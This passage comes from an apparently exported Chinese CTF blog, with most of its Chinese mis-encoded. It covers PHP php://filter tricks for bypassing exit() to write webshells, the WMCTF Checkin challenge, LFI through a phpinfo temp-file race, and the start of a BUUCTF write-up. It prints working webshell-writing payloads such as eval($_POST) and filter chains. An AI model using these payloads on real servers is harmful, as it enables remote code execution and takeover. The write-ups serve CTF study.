28å­—ç¬¦ &lt;?php @eval($_POST[abcd]);?&gt; è½¬ä¸º hp?&lt;e@ p(lavOP_$a[TS]dcb&gt;?;) payload: content=php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@ p(lavOP_$a[TS]dcb&gt;?;)/resource=shell.php æˆåŠŸå†™å…¥ï¼š hp?&lt;xe p)(tiphp;f//:etlioc/rrevnci.t.vno-SCU.EL4-SCU|EB4&lt;?php @eval($_POST[abcd]);?&gt;ser/cruohs=e.lle utf8-utf7 è¿™é‡Œå‘ç°ç”Ÿæˆçš„æ˜¯+AD0-,ç„¶è€Œç»è¿‡æ£€æµ‹ï¼Œæ­¤å­—ç¬¦ä¸²å¯ä»¥è¢«base64è¿›è¡Œè§£ç ï¼›é‚£ä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ç§æ–¹æ³•é¿å…ç­‰å·å¯¹æˆ‘ä»¬base64è§£ç çš„å½±å“ï¼›æˆ‘ä»¬å¯ä»¥ç›´æ¥å†™å…¥base64åŠ å¯†åçš„payloadï¼Œç„¶åå°†å…¶è¿›è¡Œutfä¹‹é—´çš„è½¬æ¢ï¼Œå› ä¸ºçº¯å­—ç¬¦è½¬æ¢ä¹‹åè¿˜æ˜¯å…¶æœ¬èº«ï¼›æ‰€ä»¥å…¶ä¸å—å½±å“ï¼Œè¿›è€Œæˆ‘ä»¬çš„base64-encodeä¹‹åçš„ç¼–ç ä¾ç„¶æ˜¯å­˜åœ¨çš„ï¼Œç„¶åè¿›è¡Œbase64-decodeä¸€ä¸‹ï¼Œå†™å…¥shell. Payload: content=php://filter/write=aaaaXDw/cGhwIEBldmFsKCRfUE9TVFthXSk7ID8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=shell.php psï¼š 123456789101112// è¿™é‡Œè¦ç¬¦åˆbase64 è§£ç æŒ‰4 å­—èŠ‚è¿›è¡Œutf8 -&gt; utf-7&lt;?php exit();php://filter/write=aaaaXDw/cGhwIEBldmFsKCRfUE9TVFthXSk7ID8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=shell.phpå˜ä¸ºï¼š+ADw?php exit()+ADs-php://filter/write+AD0-aaaaXDw/cGhwIEBldmFsKCRfUE9TVFthXSk7ID8+-+AHw-convert.iconv.utf-8.utf-7+AHw-convert.base64-decode/resource+AD0-shell.phpbase64æ¶æ„payloadçš„ä¹‹å‰æ­£å¥½36ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥å†™å…¥äº†shell äº”ã€WMCTF Checkin12345678910111213141516&lt;?php//PHP 7.0.33 Apache/2.4.25error_reporting(0);$sandbox = &#x27;/var/www/html/&#x27; . md5($_SERVER[&#x27;HTTP_X_REAL_IP&#x27;]);@mkdir($sandbox);@chdir($sandbox);highlight_file(__FILE__);if(isset($_GET[&#x27;content&#x27;])) &#123; $content = $_GET[&#x27;content&#x27;]; if(preg_match(&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;,$content)) die(&#x27;hacker&#x27;); if(file_exists($content)) require_once($content); echo $content; file_put_contents($content,&#x27;&lt;?php exit();&#x27;.$content);&#125; æ­»äº¡exitçš„ç»•è¿‡ äºŒæ¬¡ç¼–ç ç»•è¿‡æŸ¥çœ‹ä¼ªåè®®å¤„ç†çš„æºç  12345678910111213141516171819202122232425static void php_stream_apply_filter_list(php_stream *stream, char *filterlist, int read_chain, int write_chain) &#123; char *p, *token = NULL; php_stream_filter *temp_filter; p = php_strtok_r(filterlist, &quot;|&quot;, &amp;token); while (p) &#123; php_url_decode(p, strlen(p));#ğŸ‘ˆå¯¹è¿‡æ»¤å™¨è¿›è¡Œäº†ä¸€æ¬¡urldecode if (read_chain) &#123; if ((temp_filter = php_stream_filter_create(p, NULL, php_stream_is_persistent(stream)))) &#123; php_stream_filter_append(&amp;stream-&gt;readfilters, temp_filter); &#125; else &#123; php_error_docref(NULL, E_WARNING, &quot;Unable to create filter (%s)&quot;, p); &#125; &#125; if (write_chain) &#123; if ((temp_filter = php_stream_filter_create(p, NULL, php_stream_is_persistent(stream)))) &#123; php_stream_filter_append(&amp;stream-&gt;writefilters, temp_filter); &#125; else &#123; php_error_docref(NULL, E_WARNING, &quot;Unable to create filter (%s)&quot;, p); &#125; &#125; p = php_strtok_r(NULL, &quot;|&quot;, &amp;token); &#125;&#125; file_put_contents ä¸­å¯ä»¥è°ƒç”¨ä¼ªåè®®ï¼Œè€Œä¼ªåè®®å¤„ç†æ—¶ä¼šå¯¹è¿‡æ»¤å™¨ urldecode ä¸€æ¬¡ï¼Œæ‰€ä»¥æ˜¯å¯ä»¥åˆ©ç”¨äºŒæ¬¡ç¼–ç ç»•è¿‡çš„ï¼Œä¸è¿‡æˆ‘ä»¬åœ¨æœåŠ¡ç«¯banäº†%25ï¼ˆç”¨%25å¤ªç®€å•äº†ï¼‰æ‰€ä»¥æµ‹è¯•%25è¢«banåå°±å¯ä»¥å†™ä¸ªè„šæœ¬è·‘ä¸€ä¸‹å­—ç¬¦ï¼Œæ„é€ ä¸€äº›è¿‡æ»¤çš„å­—ç¬¦å°±å¯ä»¥åˆ©ç”¨æ­£å¸¸çš„å§¿åŠ¿ç»•è¿‡ã€‚çŸ¥é“å¯ä»¥ç”¨äºŒæ¬¡ç¼–ç ç»•è¿‡äº†. 123456789101112&lt;?php$char = &#x27;r&#x27;; #æ„é€ rçš„äºŒæ¬¡ç¼–ç for ($ascii1 = 0; $ascii1 &lt; 256; $ascii1++) &#123; for ($ascii2 = 0; $ascii2 &lt; 256; $ascii2++) &#123; $aaa = &#x27;%&#x27;.$ascii1.&#x27;%&#x27;.$ascii2; if(urldecode(urldecode($aaa)) == $char)&#123; echo $char.&#x27;: &#x27;.$aaa; echo &quot;\\n&quot;; &#125; &#125;&#125;?&gt; payload: php://filter/write=string.%7%32ot13|&lt;?cuc cucvasb();?&gt;|/resource=Cyc1e.php æ³¨ï¼špayloadæ”¾è¿‡æ»¤å™¨çš„ä½ç½®æˆ–è€…æ”¾æ–‡ä»¶åä½ç½®éƒ½å¯ï¼ˆå› ä¸ºæœ‰äº›ç¼–ç æœ‰æ—¶å€™ä¼šæœ‰ç©ºæ ¼ä»€ä¹ˆçš„ä¹±ç ï¼Œæ–‡ä»¶åä¸ä¸€å®šå¥½ç”¨ï¼‰ï¼Œphp://filteré¢å¯¹ä¸å¯ç”¨çš„è§„åˆ™æ˜¯æŠ¥ä¸ªWarningï¼Œç„¶åè·³è¿‡ç»§ç»­æ‰§è¡Œçš„ï¼‰ã€‚ è¿‡æ»¤å™¨æ„é€ ç»•è¿‡é¢˜ç›®ä¸­è¿‡æ»¤çš„è¿‡æ»¤å™¨æœ‰ /iconv|UCS|UTF|rot|quoted|base64/ php:filteræ”¯æŒä½¿ç”¨å¤šä¸ªè¿‡æ»¤å™¨,è¿˜ç•™ä¸‹äº†å­—ç¬¦ä¸²è¿‡æ»¤å™¨ä¸­çš„éƒ¨åˆ†å’Œå‹ç¼©è¿‡æ»¤å™¨ä»¥åŠåŠ å¯†è¿‡æ»¤å™¨. zlib çš„ zlib.deflate å’Œ zlib.inflate ï¼Œç»„åˆä½¿ç”¨å‹ç¼©åå†è§£å‹åå†…å®¹è‚¯å®šä¸å˜ï¼Œä¸è¿‡æˆ‘ä»¬å¯ä»¥åœ¨ä¸­é—´éå†ä¸€ä¸‹å‰©ä¸‹çš„å‡ ä¸ªè¿‡æ»¤å™¨ï¼Œçœ‹çœ‹ä¸­é—´è¿›è¡Œä»€ä¹ˆæ“ä½œä¼šå½±å“åç»­ inflate çš„å†…å®¹ï¼Œç®€å•éå†ä¸€ä¸‹å¯ä»¥å‘ç°ä¸­é—´æ’å…¥ string.tolower è½¬åä¼šæŠŠç©ºæ ¼å’Œ exit å¤„ç†äº†å°±å¯ä»¥ç»•è¿‡exit php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=shell.php çˆ†ç ´ä¸´æ—¶æ–‡ä»¶å…ˆæ¥çœ‹çœ‹ LFI åˆ©ç”¨ä¸´æ—¶æ–‡ä»¶çš„ getshell å§¿åŠ¿ã€‚ä»¥ä¸‹å†…å®¹è½¬è½½è‡ªï¼š https://www.anquanke.com/post/id/201136 ä¾µåˆ  PHP LFIPHP LFIæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ä¸»è¦æ˜¯åŒ…å«æœ¬åœ°æœåŠ¡å™¨ä¸Šå­˜å‚¨çš„ä¸€äº›æ–‡ä»¶ï¼Œä¾‹å¦‚sessionæ–‡ä»¶ã€æ—¥å¿—æ–‡ä»¶ã€ä¸´æ—¶æ–‡ä»¶ç­‰ã€‚ä½†æ˜¯ï¼Œåªæœ‰æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶åŒ…å«çš„æ–‡ä»¶å­˜å‚¨æˆ‘ä»¬çš„æ¶æ„ä»£ç æ‰èƒ½æ‹¿åˆ°æœåŠ¡å™¨æƒé™ã€‚ å‡å¦‚åœ¨æœåŠ¡å™¨ä¸Šæ‰¾ä¸åˆ°æˆ‘ä»¬å¯ä»¥åŒ…å«çš„æ–‡ä»¶ï¼Œé‚£è¯¥æ€ä¹ˆåŠï¼Œæ­¤æ—¶å¯ä»¥é€šè¿‡åˆ©ç”¨ä¸€äº›æŠ€å·§è®©æœåŠ¡å­˜å‚¨æˆ‘ä»¬æ¶æ„ç”Ÿæˆçš„ä¸´æ—¶æ–‡ä»¶ï¼Œè¯¥ä¸´æ—¶æ–‡ä»¶åŒ…å«æˆ‘ä»¬æ„é€ çš„çš„æ¶æ„ä»£ç ï¼Œæ­¤æ—¶æœåŠ¡å™¨å°±å­˜åœ¨æˆ‘ä»¬å¯ä»¥åŒ…å«çš„æ–‡ä»¶ã€‚ ç›®å‰ï¼Œå¸¸è§çš„ä¸¤ç§ä¸´æ—¶æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨æ–¹æ³•ä¸»è¦æ˜¯ï¼š PHPINFO() and PHP7 Segment Fault ï¼Œåˆ©ç”¨è¿™ä¸¤ç§å¥‡æŠ€æ·«å·§å¯ä»¥å‘æœåŠ¡å™¨ä¸Šä¼ æ–‡ä»¶åŒæ—¶åœ¨æœåŠ¡å™¨ä¸Šç”Ÿæˆæ¶æ„çš„ä¸´æ—¶æ–‡ä»¶ï¼Œç„¶åå°†æ¶æ„çš„ä¸´æ—¶æ–‡ä»¶åŒ…å«å°±å¯ä»¥è¾¾åˆ°ä»»æ„ä»£ç æ‰§è¡Œæ•ˆæœä¹Ÿå°±å¯ä»¥æ‹¿åˆ°æœåŠ¡å™¨æƒé™è¿›è¡Œåç»­æ“ä½œã€‚ ä¸´æ—¶æ–‡ä»¶åœ¨äº†è§£æ¼æ´åˆ©ç”¨æ–¹å¼çš„æ—¶å€™ï¼Œå…ˆæ¥äº†è§£ä¸€ä¸‹PHPä¸´æ—¶æ–‡ä»¶çš„æœºåˆ¶ å…¨å±€å˜é‡ åœ¨PHPä¸­å¯ä»¥ä½¿ç”¨POSTæ–¹æ³•æˆ–è€…PUTæ–¹æ³•è¿›è¡Œæ–‡æœ¬å’ŒäºŒè¿›åˆ¶æ–‡ä»¶çš„ä¸Šä¼ ã€‚ä¸Šä¼ çš„æ–‡ä»¶ä¿¡æ¯ä¼šä¿å­˜åœ¨å…¨å±€å˜é‡$_FILESé‡Œã€‚ $_FILESè¶…çº§å…¨å±€å˜é‡å¾ˆç‰¹æ®Šï¼Œä»–æ˜¯é¢„å®šä¹‰è¶…çº§å…¨å±€æ•°ç»„ä¸­å”¯ä¸€çš„äºŒç»´æ•°ç»„ã€‚å…¶ä½œç”¨æ˜¯å­˜å‚¨å„ç§ä¸ä¸Šä¼ æ–‡ä»¶æœ‰å…³çš„ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯å¯¹äºé€šè¿‡PHPè„šæœ¬ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„æ–‡ä»¶è‡³å…³é‡è¦ã€‚ 123456$_FILES[&#x27;userfile&#x27;][&#x27;name&#x27;] å®¢æˆ·ç«¯æ–‡ä»¶çš„åŸåç§°ã€‚$_FILES[&#x27;userfile&#x27;][&#x27;type&#x27;] æ–‡ä»¶çš„ MIME ç±»å‹ï¼Œå¦‚æœæµè§ˆå™¨æä¾›è¯¥ä¿¡æ¯çš„æ”¯æŒï¼Œä¾‹å¦‚&quot;image/gif&quot;ã€‚$_FILES[&#x27;userfile&#x27;][&#x27;size&#x27;] å·²ä¸Šä¼ æ–‡ä»¶çš„å¤§å°ï¼Œå•ä½ä¸ºå­—èŠ‚ã€‚$_FILES[&#x27;userfile&#x27;][&#x27;tmp_name&#x27;] æ–‡ä»¶è¢«ä¸Šä¼ ååœ¨æœåŠ¡ç«¯å‚¨å­˜çš„ä¸´æ—¶æ–‡ä»¶åï¼Œä¸€èˆ¬æ˜¯ç³»ç»Ÿé»˜è®¤ã€‚å¯ä»¥åœ¨php.iniçš„upload_tmp_dir æŒ‡å®šï¼Œé»˜è®¤æ˜¯/tmpç›®å½•ã€‚$_FILES[&#x27;userfile&#x27;][&#x27;error&#x27;] è¯¥æ–‡ä»¶ä¸Šä¼ çš„é”™è¯¯ä»£ç ï¼Œä¸Šä¼ æˆåŠŸå…¶å€¼ä¸º0ï¼Œå¦åˆ™ä¸ºé”™è¯¯ä¿¡æ¯ã€‚$_FILES[&#x27;userfile&#x27;][&#x27;tmp_name&#x27;] æ–‡ä»¶è¢«ä¸Šä¼ ååœ¨æœåŠ¡ç«¯å­˜å‚¨çš„ä¸´æ—¶æ–‡ä»¶å åœ¨ä¸´æ—¶æ–‡ä»¶åŒ…å«æ¼æ´ä¸­ $_FILES[&#39;userfile&#39;][&#39;tmp_name&#39;] è¿™ä¸ªå˜é‡å€¼çš„è·å–å¾ˆé‡è¦ï¼Œå› ä¸ºä¸´æ—¶æ–‡ä»¶çš„åå­—éƒ½æ˜¯ç”±éšæœºå‡½æ•°ç”Ÿæˆçš„ï¼Œåªæœ‰çŸ¥é“æ–‡ä»¶çš„åå­—æ‰èƒ½æ­£ç¡®çš„å»åŒ…å«å®ƒã€‚ å­˜å‚¨ç›®å½• æ–‡ä»¶è¢«ä¸Šä¼ åï¼Œé»˜è®¤ä¼šè¢«å­˜å‚¨åˆ°æœåŠ¡ç«¯çš„é»˜è®¤ä¸´æ—¶ç›®å½•ä¸­ï¼Œè¯¥ä¸´æ—¶ç›®å½•ç”± php.ini çš„ upload_tmp_dir å±æ€§æŒ‡å®šï¼Œå‡å¦‚ upload_tmp_dir çš„è·¯å¾„ä¸å¯å†™ï¼ŒPHPä¼šä¸Šä¼ åˆ°ç³»ç»Ÿé»˜è®¤çš„ä¸´æ—¶ç›®å½•ä¸­ã€‚ ä¸åŒç³»ç»ŸæœåŠ¡å™¨å¸¸è§çš„ä¸´æ—¶æ–‡ä»¶é»˜è®¤å­˜å‚¨ç›®å½•ï¼Œäº†è§£ç³»ç»Ÿçš„é»˜è®¤å­˜å‚¨è·¯å¾„å¾ˆé‡è¦ï¼Œå› ä¸ºåœ¨å¾ˆå¤šæ—¶å€™æœåŠ¡å™¨éƒ½æ˜¯æŒ‰ç…§é»˜è®¤è®¾ç½®æ¥è¿è¡Œçš„ã€‚ * Linxuç³»ç»ŸæœåŠ¡çš„ä¸´æ—¶æ–‡ä»¶ä¸»è¦å­˜å‚¨åœ¨æ ¹ç›®å½•çš„tmpæ–‡ä»¶å¤¹ä¸‹ï¼Œå…·æœ‰ä¸€å®šçš„å¼€æ”¾æƒé™ã€‚ * Windowsç³»ç»ŸæœåŠ¡çš„ä¸´æ—¶æ–‡ä»¶ä¸»è¦å­˜å‚¨åœ¨ç³»ç»Ÿç›˜Windowsæ–‡ä»¶å¤¹ä¸‹ï¼Œå…·æœ‰ä¸€å®šçš„å¼€æ”¾æƒé™ã€‚ C:/Windows/Temp/ å‘½åè§„åˆ™ å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸Šçš„ä¸´æ—¶æ–‡ä»¶çš„æ–‡ä»¶åéƒ½æ˜¯éšæœºç”Ÿæˆçš„ï¼Œäº†è§£ä¸åŒç³»ç»ŸæœåŠ¡å™¨å¯¹ä¸´æ—¶æ–‡ä»¶çš„å‘½åè§„åˆ™å¾ˆé‡è¦ï¼Œå› ä¸ºæœ‰æ—¶å€™å¯¹äºä¸´æ—¶æ–‡ä»¶æˆ‘ä»¬éœ€è¦å»çˆ†ç ´ï¼Œæ­¤æ—¶æˆ‘ä»¬å¿…é¡»çŸ¥é“å®ƒçš„å‘½åè§„åˆ™æ˜¯ä»€ä¹ˆã€‚ å¯ä»¥é€šè¿‡phpinfoæ¥æŸ¥çœ‹ä¸´æ—¶æ–‡ä»¶çš„ä¿¡æ¯ã€‚ Linux Temporary File Linuxä¸´æ—¶æ–‡ä»¶ä¸»è¦å­˜å‚¨åœ¨/tmp/ç›®å½•ä¸‹ï¼Œæ ¼å¼é€šå¸¸æ˜¯ï¼ˆ/tmp/php[6ä¸ªéšæœºå­—ç¬¦]ï¼‰ Windows Temporary File Windowsä¸´æ—¶æ–‡ä»¶ä¸»è¦å­˜å‚¨åœ¨C:/Windows/ç›®å½•ä¸‹ï¼Œæ ¼å¼é€šå¸¸æ˜¯ï¼ˆC:/Windows/php[4ä¸ªéšæœºå­—ç¬¦].tmpï¼‰ PHPINFOç‰¹æ€§é€šè¿‡ä¸Šé¢çš„ä»‹ç»ï¼ŒæœåŠ¡å™¨ä¸Šå­˜å‚¨çš„ä¸´æ—¶æ–‡ä»¶åæ˜¯éšæœºçš„ï¼Œè¿™å°±å¾ˆéš¾è·å–å…¶çœŸå®çš„æ–‡ä»¶åã€‚ä¸è¿‡ï¼Œå¦‚æœç›®æ ‡ç½‘ç«™ä¸Šå­˜åœ¨phpinfoï¼Œåˆ™å¯ä»¥é€šè¿‡phpinfoæ¥è·å–ä¸´æ—¶æ–‡ä»¶åï¼Œè¿›è€Œè¿›è¡ŒåŒ…å«ã€‚ è™½è¯´è¿™ä¸ªæ¼æ´å‡ºç°çš„å¾ˆæ—©(2011å¹´ï¼Œå›½å¤–çš„å®‰å…¨ç ”ç©¶äººå‘˜å°†è¿™ç§æ”»å‡»æ‰‹æ³•è¿›è¡Œäº†å…¬å¸ƒ)ï¼Œä¸è¿‡è¿™ä¸ªæŠ€å·§ç¡®å®æ˜¯ä¸ªå¾ˆç»å…¸çš„åˆ—å­ï¼Œä¸ä¼šè¢«é—å¿˜çš„ã€‚ æµ‹è¯•æµ‹è¯•ä»£ç ï¼š index.php 123456&lt;?php $file = $_GET[&#x27;file&#x27;]; include($file);?&gt; phpinfo.php: &lt;?php phpinfo();?&gt; æ¼æ´åˆ†æå½“æˆ‘ä»¬åœ¨ç»™PHPå‘é€POSTæ•°æ®åŒ…æ—¶ï¼Œå¦‚æœæ•°æ®åŒ…é‡ŒåŒ…å«æ–‡ä»¶åŒºå—ï¼Œæ— è®ºä½ è®¿é—®çš„ä»£ç ä¸­æœ‰æ²¡æœ‰å¤„ç†æ–‡ä»¶ä¸Šä¼ çš„é€»è¾‘ï¼ŒPHPéƒ½ä¼šå°†è¿™ä¸ªæ–‡ä»¶ä¿å­˜æˆä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ã€‚æ–‡ä»¶åå¯ä»¥åœ¨$_FILESå˜é‡ä¸­æ‰¾åˆ°ã€‚è¿™ä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œåœ¨è¯·æ±‚ç»“æŸåå°±ä¼šè¢«åˆ é™¤ã€‚ åˆ©ç”¨phpinfoçš„ç‰¹æ€§å¯ä»¥å¾ˆå¥½çš„å¸®åŠ©æˆ‘ä»¬ï¼Œå› ä¸ºphpinfoé¡µé¢ä¼šå°†å½“å‰è¯·æ±‚ä¸Šä¸‹æ–‡ä¸­æ‰€æœ‰å˜é‡éƒ½æ‰“å°å‡ºæ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¦‚æœå‘phpinfoé¡µé¢å‘é€åŒ…å«æ–‡ä»¶åŒºå—çš„æ•°æ®åŒ…ï¼Œåˆ™å³å¯åœ¨è¿”å›åŒ…é‡Œæ‰¾åˆ°$_FILESå˜é‡çš„å†…å®¹ï¼Œæ‹¿åˆ°ä¸´æ—¶æ–‡ä»¶å˜é‡åä¹‹åï¼Œå°±å¯ä»¥è¿›è¡ŒåŒ…å«æ‰§è¡Œæˆ‘ä»¬ä¼ å…¥çš„æ¶æ„ä»£ç ã€‚ æ¼æ´åˆ©ç”¨ åˆ©ç”¨æ¡ä»¶ æ—  PHPINFOçš„è¿™ç§ç‰¹æ€§æºäºphpè‡ªèº«ï¼Œä¸phpçš„ç‰ˆæœ¬æ— å…³ æµ‹è¯•è„šæœ¬ ç¼–å†™è„šæœ¬ï¼Œä¸Šä¼ æ–‡ä»¶æ¢æµ‹æ˜¯å¦å­˜åœ¨phpinfoåŒ…å«ä¸´æ—¶æ–‡ä»¶çš„ä¿¡æ¯ã€‚ 12345678import requestsfiles = &#123; &#x27;file&#x27;: (&quot;aa.txt&quot;,&quot;ssss&quot;)&#125;url = &quot;http://x.x.x.x/phpinfo.php&quot;r = requests.post(url=url, files=files, allow_redirects=False)print(r.text) è¿è¡Œè„šæœ¬å‘æœåŠ¡å™¨å‘å‡ºè¯·æ±‚å¯ä»¥çœ‹åˆ°å›æ˜¾ä¸­æœ‰å¦‚ä¸‹å†…å®¹ linux: windowsï¼š åˆ©ç”¨åŸç† éªŒè¯äº†phpinfoçš„ç‰¹æ€§ç¡®å®å­˜åœ¨ï¼Œæ‰€ä»¥åœ¨æ–‡ä»¶åŒ…å«æ¼æ´æ‰¾ä¸åˆ°å¯åˆ©ç”¨çš„æ–‡ä»¶æ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‰¹æ€§ï¼Œæ‰¾åˆ°å¹¶æå–ä¸´æ—¶æ–‡ä»¶åï¼Œç„¶ååŒ…å«ä¹‹å³å¯Getshellã€‚ ä½†æ–‡ä»¶åŒ…å«æ¼æ´å’Œphpinfoé¡µé¢é€šå¸¸æ˜¯ä¸¤ä¸ªé¡µé¢ï¼Œç†è®ºä¸Šæˆ‘ä»¬éœ€è¦å…ˆå‘é€æ•°æ®åŒ…ç»™phpinfoé¡µé¢ï¼Œç„¶åä»è¿”å›é¡µé¢ä¸­åŒ¹é…å‡ºä¸´æ—¶æ–‡ä»¶åï¼Œå†å°†è¿™ä¸ªæ–‡ä»¶åå‘é€ç»™æ–‡ä»¶åŒ…å«æ¼æ´é¡µé¢ï¼Œè¿›è¡Œgetshellã€‚åœ¨ç¬¬ä¸€ä¸ªè¯·æ±‚ç»“æŸæ—¶ï¼Œä¸´æ—¶æ–‡ä»¶å°±è¢«åˆ é™¤äº†ï¼Œç¬¬äºŒä¸ªè¯·æ±‚è‡ªç„¶ä¹Ÿå°±æ— æ³•è¿›è¡ŒåŒ…å«ã€‚ åˆ©ç”¨è¿‡ç¨‹ è¿™ä¸ªæ—¶å€™å°±éœ€è¦ç”¨åˆ°æ¡ä»¶ç«äº‰ï¼Œå…·ä½“åŸç†å’Œè¿‡ç¨‹å¦‚ä¸‹ï¼š ï¼ˆ1ï¼‰å‘é€åŒ…å«äº†webshellçš„ä¸Šä¼ æ•°æ®åŒ…ç»™phpinfoé¡µé¢ï¼Œè¿™ä¸ªæ•°æ®åŒ…çš„headerã€getç­‰ä½ç½®éœ€è¦å¡æ»¡åƒåœ¾æ•°æ® ï¼ˆ2ï¼‰å› ä¸ºphpinfoé¡µé¢ä¼šå°†æ‰€æœ‰æ•°æ®éƒ½æ‰“å°å‡ºæ¥ï¼Œ1ä¸­çš„åƒåœ¾æ•°æ®ä¼šå°†æ•´ä¸ªphpinfoé¡µé¢æ’‘å¾—éå¸¸å¤§ ï¼ˆ3ï¼‰phpé»˜è®¤çš„è¾“å‡ºç¼“å†²åŒºå¤§å°ä¸º4096ï¼Œå¯ä»¥ç†è§£ä¸ºphpæ¯æ¬¡è¿”å›4096ä¸ªå­—èŠ‚ç»™socketè¿æ¥ ï¼ˆ4ï¼‰æ‰€ä»¥ï¼Œæˆ‘ä»¬ç›´æ¥æ“ä½œåŸç”Ÿsocketï¼Œæ¯æ¬¡è¯»å–4096ä¸ªå­—èŠ‚ã€‚åªè¦è¯»å–åˆ°çš„å­—ç¬¦é‡ŒåŒ…å«ä¸´æ—¶æ–‡ä»¶åï¼Œå°±ç«‹å³å‘é€ç¬¬äºŒä¸ªæ•°æ®åŒ… ï¼ˆ5ï¼‰æ­¤æ—¶ï¼Œç¬¬ä¸€ä¸ªæ•°æ®åŒ…çš„socketè¿æ¥å®é™…ä¸Šè¿˜æ²¡ç»“æŸï¼Œå› ä¸ºphpè¿˜åœ¨ç»§ç»­æ¯æ¬¡è¾“å‡º4096ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥ä¸´æ—¶æ–‡ä»¶æ­¤æ—¶è¿˜æ²¡æœ‰åˆ é™¤ ï¼ˆ6ï¼‰åˆ©ç”¨è¿™ä¸ªæ—¶é—´å·®ï¼Œç¬¬äºŒä¸ªæ•°æ®åŒ…ï¼Œä¹Ÿå°±æ˜¯æ–‡ä»¶åŒ…å«æ¼æ´çš„åˆ©ç”¨ï¼Œå³å¯æˆåŠŸåŒ…å«ä¸´æ—¶æ–‡ä»¶ï¼Œæœ€ç»ˆgetshell ï¼ˆå‚è€ƒphç‰›ï¼šhttps://github.com/vulhub/vulhub/tree/master/php/inclusion ï¼‰ getshellåˆ©ç”¨phç‰›çš„ä»£ç ï¼Œä¸ç”¨é‡å¤çš„é€ è½®å­ï¼Œç›´æ¥æ›´æ”¹è„šæœ¬ä¸»è¦çš„å‡ ä¸ªåœ°æ–¹å°±å¯ä»¥æˆåŠŸè¿è¡Œåˆ©ç”¨ï¼Œå¦‚ä¸Šä¼ çš„æ¶æ„æ–‡ä»¶å†…å®¹ã€phpinfo.phpå’Œindex.phpç›¸åº”æ–‡ä»¶çš„æ–‡ä»¶åå’Œä½ç½®ã€ç³»ç»Ÿä¸´æ—¶æ–‡ä»¶å†™å…¥ç›®å½•ç­‰","categories":[{"name":"PHP","slug":"PHP","permalink":"https://xizhi-future.github.io/categories/PHP/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"},{"name":"PHP","slug":"PHP","permalink":"https://xizhi-future.github.io/tags/PHP/"}],"author":"xizhi-future"},{"title":"BUUCTF-WEB(ä¸‰)","slug":"BUUCTF-WEBï¼ˆä¸‰ï¼‰","date":"2021-06-04T10:25:29.000Z","updated":"2021-10-07T10:14:35.068Z","comments":true,"path":"2021/06/04/BUUCTF-WEBï¼ˆä¸‰ï¼‰/","link":"","permalink":"https://xizhi-future.github.io/2021/06/04/BUUCTF-WEB%EF%BC%88%E4%B8%89%EF%BC%89/","excerpt":"æ¦‚è¿°ï¼šæœ¬ç¯‡æ˜¯ BUUCTF-WEBæ–¹å‘çš„ç¬¬ä¸‰ç¯‡ï¼Œå…¶ä¸­æ¶µç›–çš„èŒƒå›´è¾ƒå¹¿ï¼ŒåŒ…æ‹¬ SQLæ³¨å…¥ã€åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ã€æ–‡ä»¶ä¸Šä¼ ã€æ•°æ®åº“çš„ç‰¹æ€§ã€PHPå¼±ç±»å‹ã€MD5ç¢°æ’ä»¥åŠç›¸å…³æ¼æ´ã€æ–‡ä»¶åŒ…å«ã€PHPä¼ªåè®®ã€SSRFã€‚","text":"æ¦‚è¿°ï¼šæœ¬ç¯‡æ˜¯ BUUCTF-WEBæ–¹å‘çš„ç¬¬ä¸‰ç¯‡ï¼Œå…¶ä¸­æ¶µç›–çš„èŒƒå›´è¾ƒå¹¿ï¼ŒåŒ…æ‹¬ SQLæ³¨å…¥ã€åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ã€æ–‡ä»¶ä¸Šä¼ ã€æ•°æ®åº“çš„ç‰¹æ€§ã€PHPå¼±ç±»å‹ã€MD5ç¢°æ’ä»¥åŠç›¸å…³æ¼æ´ã€æ–‡ä»¶åŒ…å«ã€PHPä¼ªåè®®ã€SSRFã€‚ ä¸€ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag1è€ƒç‚¹ï¼šPHP å¼±ç±»å‹ã€strcmp() å‡½æ•°æ¼æ´ æŸ¥çœ‹æºç å‘ç° 1234567891011&lt;!-- ~~~post money and password~~~if (isset($_POST[&#x27;password&#x27;])) &#123; $password = $_POST[&#x27;password&#x27;]; if (is_numeric($password)) &#123; echo &quot;password can&#x27;t be number&lt;/br&gt;&quot;; &#125;elseif ($password == 404) &#123; echo &quot;Password Right!&lt;/br&gt;&quot;; &#125;&#125;--&gt; æ ¹æ®PHPçš„å¼±ç±»å‹ï¼Œç›´æ¥æ„é€  money=100000000&amp;password=404a æ˜¾è€Œæ˜“è§ï¼Œè¦æˆ‘ä»¬æ˜¯cuitçš„èº«ä»½æ‰å¯ä»¥ æŠ“åŒ…æŸ¥çœ‹ï¼Œå­˜åœ¨ user=0ï¼Œå½“ç„¶ï¼Œç›´æ¥è¿›è¡Œä¿®æ”¹ user=1ï¼Œå‘ç° èº«ä»½å·²ç»æ”¹å˜ï¼Œç„¶åæˆ‘ä»¬postä¼ å…¥å‚æ•° password å’Œ money æç¤ºæˆ‘ä»¬ æ•°å­—è¿‡é•¿ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç§‘å­¦è®¡æ•°æ³• 1e9 æˆ–è€…æ˜¯ money[]=100000000 äºŒã€[BJDCTF2020]Easy MD51è€ƒç‚¹ï¼šmd5($a,true) 